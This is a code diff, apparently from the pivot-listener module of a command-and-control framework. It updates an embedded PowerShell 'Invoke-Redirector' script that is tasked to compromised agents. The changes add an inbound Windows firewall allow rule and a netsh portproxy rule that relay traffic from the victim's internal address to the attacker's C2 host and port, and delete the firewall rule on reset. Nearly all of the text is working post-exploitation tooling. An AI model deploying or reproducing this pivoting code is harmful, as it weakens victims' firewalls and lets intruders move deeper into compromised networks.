@@ -74,7 +74,7 @@ class Listener(object):
         (i.e. a default HTTP page), put the generation here.
         """
         print(helpers.color("[!] default_response() not implemented for pivot listeners"))
-        return ''
+        return b''
 
     def validate_options(self):
         """
@@ -737,8 +737,7 @@ def send_message(packets=None):
                     # logic for powershell agents
                     script = """
         function Invoke-Redirector {
-            param($ListenPort, $ConnectHost, [switch]$Reset, [switch]$ShowAll)
-
+            param($FirewallName, $ListenAddress, $ListenPort, $ConnectHost, [switch]$Reset, [switch]$ShowAll)
             if($ShowAll){
                 $out = netsh interface portproxy show all
                 if($out){
@@ -749,6 +748,7 @@ def send_message(packets=None):
                 }
             }
             elseif($Reset){
+                Netsh.exe advfirewall firewall del rule name="$FirewallName"
                 $out = netsh interface portproxy reset
                 if($out){
                     $out
@@ -788,8 +788,8 @@ def send_message(packets=None):
                         $ConnectPort = $parts[2]
                     }
                     if($ConnectPort -ne ""){
-
-                        $out = netsh interface portproxy add v4tov4 listenport=$ListenPort connectaddress=$ConnectAddress connectport=$ConnectPort protocol=tcp
+                        Netsh.exe advfirewall firewall add rule name=`"$FirewallName`" dir=in action=allow protocol=TCP localport=$ListenPort enable=yes
+                        $out = netsh interface portproxy add v4tov4 listenaddress=$ListenAddress listenport=$ListenPort connectaddress=$ConnectAddress connectport=$ConnectPort protocol=tcp
                         if($out){
                             $out
                         }
@@ -806,7 +806,11 @@ def send_message(packets=None):
         Invoke-Redirector"""
 
                     script += " -ConnectHost %s" % (listenerOptions['Host']['Value'])
+                    script += " -ConnectPort %s" % (listenerOptions['Port']['Value'])
+                    script += " -ListenAddress %s" % (tempOptions['internalIP']['Value'])
                     script += " -ListenPort %s" % (tempOptions['ListenPort']['Value'])
+                    script += " -FirewallName %s" % (sessionID)
+
 
                     # clone the existing listener options
                     self.options = copy.deepcopy(listenerOptions)
@@ -871,8 +875,7 @@ def send_message(packets=None):
 
                     script = """
                 function Invoke-Redirector {
-                    param($ListenPort, $ConnectHost, [switch]$Reset, [switch]$ShowAll)
-
+                    param($FirewallName, $ListenAddress, $ListenPort, $ConnectHost, [switch]$Reset, [switch]$ShowAll)                   
                     if($ShowAll){
                         $out = netsh interface portproxy show all
                         if($out){
@@ -883,6 +886,7 @@ def send_message(packets=None):
                         }
                     }
                     elseif($Reset){
+                        Netsh.exe advfirewall firewall del rule name="$FirewallName"
                         $out = netsh interface portproxy reset
                         if($out){
                             $out
@@ -922,8 +926,8 @@ def send_message(packets=None):
                                 $ConnectPort = $parts[2]
                             }
                             if($ConnectPort -ne ""){
-
-                                $out = netsh interface portproxy add v4tov4 listenport=$ListenPort connectaddress=$ConnectAddress connectport=$ConnectPort protocol=tcp
+                                Netsh.exe advfirewall firewall add rule name=`"$FirewallName`" dir=in action=allow protocol=TCP localport=$ListenPort enable=yes
+                                $out = netsh interface portproxy add v4tov4 listenaddress=$ListenAddress listenport=$ListenPort connectaddress=$ConnectAddress connectport=$ConnectPort protocol=tcp
                                 if($out){
                                     $out
                                 }
@@ -940,6 +944,7 @@ def send_message(packets=None):
                 Invoke-Redirector"""
 
                     script += " -Reset"
+                    script += " -FirewallName %s" % (sessionID)
 
                     self.mainMenu.agents.add_agent_task_db(sessionID, "TASK_SHELL", script)
                     msg = "Tasked agent to uninstall Pivot listener "
